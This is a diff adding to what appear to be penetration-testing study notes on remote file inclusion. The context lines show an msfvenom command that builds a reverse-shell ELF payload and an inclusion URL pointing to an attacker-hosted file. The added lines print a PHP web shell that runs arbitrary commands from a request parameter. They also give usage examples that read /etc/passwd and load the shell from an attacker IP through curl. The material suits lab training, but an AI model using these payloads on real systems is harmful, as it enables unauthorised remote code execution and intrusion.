@@ -12,3 +12,18 @@ However in some cases it will not work then you have to create your payload with
 msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=x.x.x.x LPORT=y.y.y.y -o offsec -- and repeate privious step 
 ip.com/id=http://attackerip:8000/offsec
 ---------------------------------------------------------
+
+kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
+...
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd or 
+       curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
